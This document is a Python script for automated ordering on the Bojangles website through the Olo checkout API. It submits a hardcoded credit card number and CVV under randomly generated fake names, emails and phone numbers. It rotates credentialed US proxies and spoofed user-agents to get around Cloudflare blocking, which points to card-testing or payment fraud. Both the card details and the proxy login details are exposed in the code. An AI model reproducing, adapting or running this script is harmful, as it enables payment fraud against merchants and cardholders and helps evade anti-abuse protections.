import requests
import random

# --- VALIDATED USA PROXIES ONLY (7 Working Proxies) ---
usa_proxy_list = [
    "iicwyzxj:43fcbrangis0@142.111.48.253:7030",  # Los Angeles, California
    "iicwyzxj:43fcbrangis0@23.95.150.145:6114",   # Buffalo, New York
    "iicwyzxj:43fcbrangis0@198.23.239.134:6540",  # Buffalo, New York
    "iicwyzxj:43fcbrangis0@107.172.163.27:6543",  # Buffalo, New York
    "iicwyzxj:43fcbrangis0@216.10.27.159:6837",   # Los Angeles, California
    "iicwyzxj:43fcbrangis0@23.26.71.145:5628",    # Orem, Utah
    "iicwyzxj:43fcbrangis0@23.27.208.120:5830",   # Reston, Virginia
]

# --- List of User-Agents to rotate ---
user_agent_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
]

# --- Pre-defined lists for rotating user data ---
first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
email_domains = ["@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com"]

def get_random_phone_number():
    """Generates a random US-formatted phone number."""
    area_code = random.randint(201, 999)
    central_office = random.randint(100, 999)
    line_number = random.randint(1000, 9999)
    return f"{area_code}-{central_office}-{line_number}"

def process_order():
    """
    This function gets an access token dynamically, uses pre-defined user data (including random phone),
    and submits the order through a random USA proxy.
    """
    try:
        # --- Step 1: Select Random USA Proxy and User-Agent ---
        proxy_choice = random.choice(usa_proxy_list)
        proxies = {
            "http": f"http://{proxy_choice}",
            "https": f"http://{proxy_choice}",
        }
        user_agent = random.choice(user_agent_list)
        
        print(f"[*] Using USA Proxy: {proxy_choice.split('@')[1]}")
        print(f"[*] Using User-Agent: {user_agent}")

        # --- Step 2: Get the Dynamic Access Token ---
        token_headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB',
            'client_type': 'web',
            'env': 'prod',
            'origin': 'https://www.bojangles.com',
            'priority': 'u=1, i',
            'referer': 'https://www.bojangles.com/order/checkout',
            'user-agent': user_agent,
        }

        order_id = "def67214-7132-4e25-a8ea-7a18923f734f"
        token_url = f'https://www.bojangles.com/api/v1/orders/{order_id}/token'
        
        print("\n[*] Fetching access token...")
        token_response = requests.post(token_url, headers=token_headers, proxies=proxies, timeout=20)
        token_response.raise_for_status()
        
        # Fixed: Changed 'accessToken' to 'accesstoken' (lowercase)
        access_token = token_response.json().get('accesstoken')
        if not access_token:
            print("[!] Failed to retrieve access token.")
            print("Response:", token_response.text)
            return

        print(f"[+] Successfully retrieved Access Token: {access_token}")

        # --- Step 3: Submit the Order with Rotated Pre-defined Data ---
        checkout_headers = {
            'accept': '*/*',
            'accept-language': 'en-GB',
            'content-type': 'application/json',
            'origin': 'https://www.olocheckout.com',
            'priority': 'u=1, i',
            'referer': f'https://www.olocheckout.com/checkout?brandAccessId=pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn&BasketGuid={order_id}',
            'user-agent': user_agent,
            'x-olo-domain-origin': 'https://www.bojangles.com',
            'x-olo-request': '1',
        }

        # Generate random user data from the lists
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10,99)}{random.choice(email_domains)}"
        phone_number = get_random_phone_number()
        
        print("\n[*] Using Rotated User Data:")
        print(f"    - Name: {first_name} {last_name}")
        print(f"    - Email: {email}")
        print(f"    - Phone: {phone_number}")

        json_data = {
            'brandAccessId': 'pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn',
            'accessToken': access_token,  # Using the dynamic token
            'firstName': first_name,
            'lastName': last_name,
            'emailAddress': email,
            'contactNumber': phone_number,  # Using the random phone number
            'customData': [],
            'billingAccounts': [
                {
                    'billingFields': [],
                    'billingMethod': 'creditcard',
                    'expiryYear': '2028',
                    'expiryMonth': '10',
                    'zip': '10080',
                    'saveOnFile': False,
                    'amount': 11.49,
                    'tipPortion': 0,
                    'cardNumber': '4677845104934858',
                    'cvv': '548',
                },
            ],
            'bookingUserOptIntoSms': False,
            'createOloAccount': False,
        }

        print("\n[*] Submitting order...")
        submit_url = f'https://www.olocheckout.com/api/baskets/{order_id}/submit'
        submit_response = requests.post(submit_url, headers=checkout_headers, json=json_data, proxies=proxies, timeout=20)

        print("\n" + "="*70)
        print("FINAL RESPONSE")
        print("="*70)
        print(f"Status Code: {submit_response.status_code}")
        
        # Check if still blocked by Cloudflare
        if "Cloudflare" in submit_response.text and "Sorry, you have been blocked" in submit_response.text:
            print("\n[-] Still blocked by Cloudflare despite using USA proxy.")
            print("[-] This proxy IP might be blacklisted by Cloudflare.")
            print("[-] Try running the script again to use a different USA proxy.")
        elif submit_response.status_code == 200:
            print("\n[+] SUCCESS! Order submitted successfully!")
        else:
            print("\n[!] Unexpected response. Check details below:")
        
        print("\nResponse Body:")
        print(submit_response.text)
        print("="*70)

    except requests.exceptions.ProxyError as e:
        print(f"\n[!] Proxy Error: The proxy {proxy_choice.split('@')[1]} failed.")
        print(f"    Details: {e}")
        print("    Try running the script again to use a different proxy.")
    except requests.exceptions.Timeout:
        print(f"\n[!] Request Timed Out: The request took too long to respond.")
        print("    Try running the script again with a different proxy.")
    except requests.exceptions.RequestException as e:
        print(f"\n[!] An error occurred during the request: {e}")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

# --- Run the main function ---
if __name__ == "__main__":
    print("="*70)
    print("BOJANGLES ORDER AUTOMATION SCRIPT")
    print("Using 7 Validated USA Proxies")
    print("="*70)
    process_order()
